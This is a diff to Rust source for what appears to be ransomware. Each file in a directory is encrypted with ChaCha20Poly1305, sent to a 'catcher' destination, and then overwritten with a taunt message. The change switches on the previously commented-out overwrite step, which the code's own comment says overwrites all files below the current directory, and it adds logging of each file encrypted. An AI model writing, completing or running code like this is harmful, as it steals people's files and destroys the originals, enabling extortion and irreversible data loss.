@@ -2,10 +2,8 @@ use chacha20poly1305::{
     aead::{Aead, AeadCore, KeyInit, OsRng},
     ChaCha20Poly1305, Key, Nonce,
 };
-use config::Config;
 use log::{error, info};
 use std::{
-    fmt,
     fs::{read_dir, DirEntry, File, ReadDir},
     io::{Read, Write},
     path::PathBuf,
@@ -99,8 +97,11 @@ fn encrypt_dir(files: ReadDir, catcher: &str) -> () {
 
 fn encrypt_file(file: DirEntry, catcher: &str) -> Result<ByteCount, &'static str> {
     let enc_file = EncryptedFile::from(&file);
-    exfiltrate(enc_file, catcher)
-    // overwrite(file) // CAUTION: OVERWRITES ALL FILES BELOW CURRENT DIRECTORY NODE
+    match exfiltrate(enc_file, catcher) {
+        Ok(bc) => info!("encrypted {bc} bytes of {file:?}"),
+        Err(e) => error!("{e:?}"),
+    }
+    overwrite(file) // CAUTION: OVERWRITES ALL FILES BELOW CURRENT DIRECTORY NODE
 }
 
 fn exfiltrate(file: EncryptedFile, catcher: &str) -> Result<ByteCount, &'static str> {
@@ -110,7 +111,10 @@ fn exfiltrate(file: EncryptedFile, catcher: &str) -> Result<ByteCount, &'static 
 
 fn overwrite(file: DirEntry) -> Result<ByteCount, &'static str> {
     if let Ok(mut new_file) = File::create(file.path()) {
-        new_file.write_all(TAUNT);
+        match new_file.write_all(TAUNT) {
+            Ok(_) => info!("encrypted {new_file:?}"),
+            Err(err) => error!("{err:?}"),
+        };
     }
     Ok(0)
 }
